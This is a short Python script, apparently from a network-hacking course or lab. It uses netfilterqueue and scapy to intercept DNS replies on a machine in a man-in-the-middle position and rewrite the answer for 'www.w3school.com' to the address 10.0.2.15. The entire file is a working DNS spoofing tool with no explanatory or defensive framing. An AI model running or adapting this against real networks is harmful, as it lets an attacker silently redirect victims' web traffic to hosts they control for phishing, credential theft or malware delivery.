#!/usr/bin/env python
import argparse
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packets = scapy.IP(packet.get_payload())
    if scapy_packets.haslayer(scapy.DNSRR):
        qname = scapy_packets[scapy.DNSQR].qname
        if "www.w3school.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packets[scapy.DNS].an = answer
            scapy_packets[scapy.DNS].ancount = 1

            del scapy_packets[scapy.IP].len
            del scapy_packets[scapy.IP].chksum
            del scapy_packets[scapy.UDP].len
            del scapy_packets[scapy.UDP].chksum

            packet.set_payload(str(scapy_packets))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("[-] Ctrl+C detected exiting.....")
